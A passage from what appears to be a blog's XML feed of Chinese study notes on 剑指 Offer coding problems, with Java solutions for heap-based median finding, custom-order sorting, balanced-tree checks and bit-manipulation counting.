class="keyword">else</span> <span class="keyword">if</span> (num &lt; pq.peek()) &#123;</span><br><span class="line">                pq.poll();</span><br><span class="line">                pq.offer(num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 返回堆中的元素</span></span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[pq.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num: pq) &#123;</span><br><span class="line">            res[idx++] = num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆</tag>
      
      <tag>排序算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 41. 数据流中的中位数</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2041.%20%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%AD%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2041.%20%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%AD%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>如何得到一个数据流中的中位数？如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。</p><p>例如<br>[2,3,4] 的中位数是 3<br>[2,3] 的中位数是 (2 + 3) &#x2F; 2 &#x3D; 2.5</p><p>设计一个支持以下两种操作的数据结构：<br>void addNum(int num) - 从数据流中添加一个整数到数据结构中。<br>double findMedian() - 返回目前所有元素的中位数。</p><p><img src="/upload/2022/03/image-dee009bdb3e74f1d8418cbd1a745aa8f.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>求中位数很明显可以排序后得到，但是期间会不断插入新的数据，每次插入新的数据后都要进行一次排序，这样虽然可以做出来但是效率很低，所以需要采用其他更优的方。看题解发现很多人都使用的大顶堆加小顶堆的方法，这个方法在上一个排序题中就有人使用，但是觉得效率一般，现在看来堆这种数据结构还是有它的特点的。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>Java中有封装好的堆数据结构，其中默认是小顶堆(MaxHeap)，大顶堆可以通过如下方式创建：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> A = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(); <span class="comment">// 小顶堆，保存较大的一半</span></span><br><span class="line"> B = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((x, y) -&gt; (y - x)); <span class="comment">// 大顶堆，保存较小的一半</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//B的这种声明方式是lamdba表达式的写法，使用匿名内部类如下</span></span><br><span class="line">A=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;Integer&gt;() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Integer o1, Integer o2)</span> &#123;</span><br><span class="line"><span class="comment">// TODO 自动生成的方法存根</span></span><br><span class="line"><span class="keyword">return</span> o2-o1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>建立一个 小顶堆 A 和 大顶堆 B ，各保存列表的一半元素，且规定：<br>A 保存 较大 的一半，长度为 N&#x2F;2（ N 为偶数）或 (N+1)&#x2F;2（ N 为奇数）；<br>B 保存 较小 的一半，长度为 N&#x2F;2（ N 为偶数）或 (N-1)&#x2F;2（ N 为奇数）；<br>随后，中位数可仅根据 A,B 的堆顶元素计算得到。</p><p><img src="/upload/2022/03/image-a679907639394f66aa1d2eb1328959ae.png" alt="image.png"></p><p><strong>算法流程：</strong><br>设元素总数为 N &#x3D; m + n ，其中 m 和 n 分别为 A 和 B 中的元素个数。<br>addNum(num) 函数：</p><ol><li>当 m&#x3D;n（即 N 为 偶数）：需向 A 添加一个元素。实现方法：将新元素 num插入至 B ，再将 B 堆顶元素插入至 A ；</li><li>当 m !&#x3D;n（即 N 为 奇数）：需向 B 添加一个元素。实现方法：将新元素 num插入至 A ，再将 A 堆顶元素插入至 B ；<blockquote><p>假设插入数字 num 遇到情况 1 。由于 num 可能属于 “较小的一半” （即属于 B ），因此不能将 num直接插入至 A 。而应先将 num 插入至 B ，再将 B 堆顶元素插入至 A 。这样就可以始终保持 A 保存较大一半、 B 保存较小一半。</p></blockquote></li></ol><p>findMedian() 函数：<br>当 m&#x3D;n（ N 为 偶数）：则中位数为 ( A 的堆顶元素 + B 的堆顶元素 )&#x2F;2。<br>当m !&#x3D;n（ N 为 奇数）：则中位数为 A 的堆顶元素。</p><p><strong>复杂度分析：</strong><br>时间复杂度：<br>查找中位数 O(1) ： 获取堆顶元素使用 O(1)时间；<br>添加数字 O(logN) ： 堆的插入和弹出操作使用O(logN) 时间。<br>空间复杂度 O(N) ： 其中 N 为数据流中的元素数量，小顶堆 A 和大顶堆 B 最多同时保存 N 个元素。</p><p><strong>解题代码:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MedianFinder</span> &#123;</span><br><span class="line">    Queue&lt;Integer&gt; A, B;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MedianFinder</span><span class="params">()</span> &#123;</span><br><span class="line">        A = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(); <span class="comment">// 小顶堆，保存较大的一半</span></span><br><span class="line">        B = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((x, y) -&gt; (y - x)); <span class="comment">// 大顶堆，保存较小的一半</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(A.size() != B.size()) &#123;</span><br><span class="line">            A.add(num);</span><br><span class="line">            B.add(A.poll());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            B.add(num);</span><br><span class="line">            A.add(B.poll());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">findMedian</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> A.size() != B.size() ? A.peek() : (A.peek() + B.peek()) / <span class="number">2.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PriorityQueue常用方法"><a href="#PriorityQueue常用方法" class="headerlink" title="PriorityQueue常用方法"></a>PriorityQueue常用方法</h2><p>（1）add：插入一个元素，不成功会抛出异常<br>（2）offer：插入一个元素，不能被立即执行的情况下会返回一个特殊的值（true 或者 false）<br>（3）remove：删除一个元素，如果不成功会返回false。<br>（4）poll：删除一个元素，并返回删除的元素<br>（5）peek：查询队顶元素<br>（6）indexOf(Object o)：查询对象o的索引<br>（7）contain(Object o)：判断是否容纳了元素</p>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆</tag>
      
      <tag>排序算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 45. 把数组排成最小的数</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2045.%20%E6%8A%8A%E6%95%B0%E7%BB%84%E6%8E%92%E6%88%90%E6%9C%80%E5%B0%8F%E7%9A%84%E6%95%B0/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2045.%20%E6%8A%8A%E6%95%B0%E7%BB%84%E6%8E%92%E6%88%90%E6%9C%80%E5%B0%8F%E7%9A%84%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入一个非负整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。<br><img src="/upload/2022/03/image-31d4a2aee3c64199a993e5f27396ba88.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>最初看到题目的想法是分析数据，发现可以通过比较整数的首位数字，如果首位数字大，那么这个数就应该排在后面，如果数字是0那就排在最前面。此外如果首位数字一样，十位数和个位数进行比较的话比较麻烦，不过也是可以进行比较的得出来结果的。但是当我开始编码的时候，不知道如何获取一个整数的首位数字，感觉写个函数又太麻烦了，还是没写出来。后来才知道自己的这个想法可以通过compareTo()方法实现<br>看了题解的思路感觉太妙了，这题重要是想到a+b &lt; b+a，通过比较这个对数字进行排序。</p><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p><strong>解题思路：</strong><br>此题求拼接起来的最小数字，本质上是一个排序问题。设数组 nums 中任意两数字的字符串为 x 和 y ，则规定 排序判断规则 为：</p><p>若拼接字符串 x + y &gt; y + x，则 x “大于” y ；<br>反之，若 x + y &lt; y + x ，则 x “小于” y ；<br>x “小于” y 代表：排序完成后，数组中 x 应在 y 左边；“大于” 则反之。</p><p>根据以上规则，套用任何排序方法对 numsnums 执行排序即可。</p><p><strong>算法流程</strong>：<br>初始化： 字符串列表 strs ，保存各数字的字符串格式；<br>列表排序： 应用以上 “排序判断规则” ，对 strs 执行排序；<br>返回值： 拼接 strs 中的所有字符串，并返回。</p><p><strong>复杂度分析</strong>：<br>时间复杂度O(NlogN) ： N 为最终返回值的字符数量（ strs 列表的长度≤N ）；使用快排或内置函数的平均时间复杂度为 O(NlogN) ，最差为 O(N^2) 。<br>空间复杂度 O(N) ： 字符串列表 strs 占用线性大小的额外空间。</p><p><strong>编码</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">minNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        String[] strs = <span class="keyword">new</span> <span class="title class_">String</span>[nums.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            strs[i] = String.valueOf(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        quickSort(strs, <span class="number">0</span>, strs.length - <span class="number">1</span>);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (String s : strs)</span><br><span class="line">            res.append(s);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(String[] strs, <span class="type">int</span> low, <span class="type">int</span> high)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">middle</span> <span class="operator">=</span> getMiddle(strs, low, high);</span><br><span class="line">            quickSort(strs, low, middle - <span class="number">1</span>);</span><br><span class="line">            quickSort(strs, middle + <span class="number">1</span>, high);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMiddle</span><span class="params">(String[] strs, <span class="type">int</span> low, <span class="type">int</span> high)</span> &#123;</span><br><span class="line">        <span class="comment">//数组的第一个数为基准元素</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> strs[low];</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="comment">//从后向前找比基准小的数</span></span><br><span class="line">            <span class="keyword">while</span> (low &lt; high &amp;&amp; (strs[high] + temp).compareTo(temp + strs[high]) &gt;= <span class="number">0</span>)</span><br><span class="line">                high--;</span><br><span class="line">            <span class="comment">//把比基准小的数移到低端</span></span><br><span class="line">            strs[low] = strs[high];</span><br><span class="line">            <span class="comment">//从前向后找比基准大的数</span></span><br><span class="line">            <span class="keyword">while</span> (low &lt; high &amp;&amp; (strs[low] + temp).compareTo(temp + strs[low]) &lt;= <span class="number">0</span>)</span><br><span class="line">                low++;</span><br><span class="line">            <span class="comment">//把比基准大的数移到高端</span></span><br><span class="line">            strs[high] = strs[low];</span><br><span class="line">        &#125;</span><br><span class="line">        strs[low] = temp;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>排序算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 55 - II. 平衡二叉树</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2055%20-%20II.%20%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2055%20-%20II.%20%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入一棵二叉树的根节点，判断该树是不是平衡二叉树。如果某二叉树中任意节点的左右子树的深度相差不超过1，那么它就是一棵平衡二叉树。<br><img src="/upload/2022/03/image-6ba8964378c64d9aaeda17bfea370461.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>需要判断一棵树是否为平衡二叉树，需要遍历每一个节点，判断该节点的左右两个子节点深度是否相差超过一，很明显需要用到递归的方法，但是没做出来，最开始没想到这个思路。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>看了题解后发现有几种做法，第一种从树的顶部开始遍历，之后再判断叶子节点，这种做法比较好想到，但是因为有太多重复计算，所以效率不高。</p><p>时间复杂度 O(NlogN)<br>空间复杂度 O(N)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBalanced</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> Math.abs(depth(root.left) - depth(root.right)) &lt;= <span class="number">1</span> &amp;&amp; isBalanced(root.left) &amp;&amp; isBalanced(root.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">depth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> Math.max(depth(root.left), depth(root.right)) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二种做法是从底部开始遍历</p><p>时间复杂度 O(NlogN)<br>空间复杂度 O(N)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBalanced</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> recur(root) != -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">recur</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> recur(root.left);</span><br><span class="line">        <span class="keyword">if</span>(left == -<span class="number">1</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> recur(root.right);</span><br><span class="line">        <span class="keyword">if</span>(right == -<span class="number">1</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> Math.abs(left - right) &lt; <span class="number">2</span> ? Math.max(left, right) + <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>递归</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 56 - I. 数组中数字出现的次数   II. 数组中数字出现的次数 II</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2056%20-%20I.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E6%95%B0%E5%AD%97%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0%20%20%20II.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E6%95%B0%E5%AD%97%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0%20II/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2056%20-%20I.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E6%95%B0%E5%AD%97%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0%20%20%20II.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E6%95%B0%E5%AD%97%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0%20II/</url>
    
    <content type="html"><![CDATA[<h1 id="数组中数字出现的次数"><a href="#数组中数字出现的次数" class="headerlink" title="数组中数字出现的次数"></a>数组中数字出现的次数</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>一个整型数组 nums 里除两个数字之外，其他数字都出现了两次。请写程序找出这两个只出现一次的数字。要求时间复杂度是O(n)，空间复杂度是O(1)。<br><img src="/upload/2022/03/image-e74122e9223e412793e769b1eaca288b.png" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>本题难点： 数组 nums 有 两个 只出现一次的数字，因此无法通过异或直接得到这两个数字。<br>设两个只出现一次的数字为 x , y ，由于 x !&#x3D;y ，则 x 和 y 二进制至少有一位不同（即分别为 0 和 1 ），根据此位可以将 nums 拆分为分别包含 x 和 y 的两个子数组。</p><p>易知两子数组都满足 「除一个数字之外，其他数字都出现了两次」。因此，分别对两子数组遍历执行异或操作，即可得到两个只出现一次的数字 x, y 。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><strong>算法流程：</strong><br>遍历 nums 执行异或：<br>设整型数组 nums &#x3D; [a, a, b, b, …, x, y] ，对 nums 中所有数字执行异或，得到的结果为x⊕y ，即：a⊕a⊕b⊕b⊕…⊕x⊕y</p><p>循环左移计算 m ：<br>根据异或运算定义，若整数 x⊕y 某二进制位为 1 ，则 x 和 y 的此二进制位一定不同。换言之，找到 x⊕y 某为 1 的二进制位，即可将数组 nums 拆分为上述的两个子数组。根据与运算特点，可知对于任意整数 a 有：<br>若 a&amp;0001&#x3D;1 ，则 a 的第一位为 1 ；<br>若 a&amp;0010&#x3D;1 ，则 a 的第二位为 1 ；<br>以此类推……<br>因此，初始化一个辅助变量 m &#x3D; 1 ，通过与运算从右向左循环判断，可 获取整数 x⊕y 首位 1 ，记录于 m 中</p><p>拆分 nums 为两个子数组：<br>分别遍历两个子数组执行异或：<br>通过遍历判断 nums 中各数字和 m 做与运算的结果，可将数组拆分为两个子数组，并分别对两个子数组遍历求异或，则可得到两个只出现一次的数字，代码如下：</p><p><strong>复杂度分析：</strong><br>时间复杂度 O(N) ： 线性遍历 nums 使用 O(N) 时间，遍历 x⊕y 二进制位使用 O(32)&#x3D;O(1) 时间。<br>空间复杂度 O(1) ： 辅助变量 a , b , x , y 使用常数大小额外空间。</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] singleNumbers(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>, y = <span class="number">0</span>, n = <span class="number">0</span>, m = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num : nums)               <span class="comment">// 1. 遍历异或</span></span><br><span class="line">            n ^= num;</span><br><span class="line">        <span class="keyword">while</span>((n &amp; m) == <span class="number">0</span>)               <span class="comment">// 2. 循环左移，计算 m</span></span><br><span class="line">            m &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num: nums) &#123;              <span class="comment">// 3. 遍历 nums 分组</span></span><br><span class="line">            <span class="keyword">if</span>((num &amp; m) != <span class="number">0</span>) x ^= num;  <span class="comment">// 4. 当 num &amp; m != 0</span></span><br><span class="line">            <span class="keyword">else</span> y ^= num;                <span class="comment">// 4. 当 num &amp; m == 0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;x, y&#125;;          <span class="comment">// 5. 返回出现一次的数字</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数组中数字出现的次数-II"><a href="#数组中数字出现的次数-II" class="headerlink" title="数组中数字出现的次数 II"></a>数组中数字出现的次数 II</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>在一个数组 nums 中除一个数字只出现一次之外，其他数字都出现了三次。请找出那个只出现一次的数字。<br> <img src="/upload/2022/03/image-757facb7ae24483e8824d6a4af186b66.png" alt="image.png"></p><h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><p>如下图所示，考虑数字的二进制形式，对于出现三次的数字，各 二进制位 出现的次数都是 3 的倍数。<br>因此，统计所有数字的各二进制位中 1 的出现次数，并对 3 求余，结果则为只出现一次的数字。</p><p><img src="/upload/2022/03/image-ab92f48876fc44c281efc83fd54b3a5a.png" alt="image.png"></p><h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2><p><strong>遍历统计</strong><br>此方法相对容易理解，但效率较低。</p><p>使用 与运算 ，可获取二进制数字 num 的最右一位<br>n_1&#x3D;num&amp;i</p><p>配合 无符号右移操作 ，可获取 num 所有位的值（即 n_1 ~ n_32）：<br>num &#x3D; num &gt;&gt;&gt; 1<br>num &#x3D; num&gt;&gt;&gt;1</p><p>建立一个长度为 32 的数组 counts ，通过以上方法可记录所有数字的各二进制位的 1 的出现次数。<br>将 counts 各元素对 3 求余，则结果为 “只出现一次的数字” 的各二进制位。</p><p>利用 左移操作 和 或运算 ，可将 counts 数组中各二进位的值恢复到数字 res 上（循环区间是 i∈[0,31] ）。<br>最终返回 resres 即可。</p><p><strong>复杂度分析：</strong><br>时间复杂度 O(N) ： 其中 N 位数组 nums 的长度；遍历数组占用 O(N) ，每轮中的常数个位运算操作占用 O(1) 。<br>空间复杂度 O(1) ： 数组 counts 长度恒为 32 ，占用常数大小的额外空间。</p><p><strong>代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] counts = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">32</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">32</span>; j++) &#123;</span><br><span class="line">                counts[j] += num &amp; <span class="number">1</span>;</span><br><span class="line">                num &gt;&gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>, m = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">            res &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            res |= counts[<span class="number">31</span> - i] % m;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>位运算</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>剑指 Offer 68 - II. 二叉树的最近公共祖先</title>
    <link href="/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2068%20-%20II.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/"/>
    <url>/2023/06/18/%E5%89%91%E6%8C%87%20Offer%2068%20-%20II.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/</url>
    
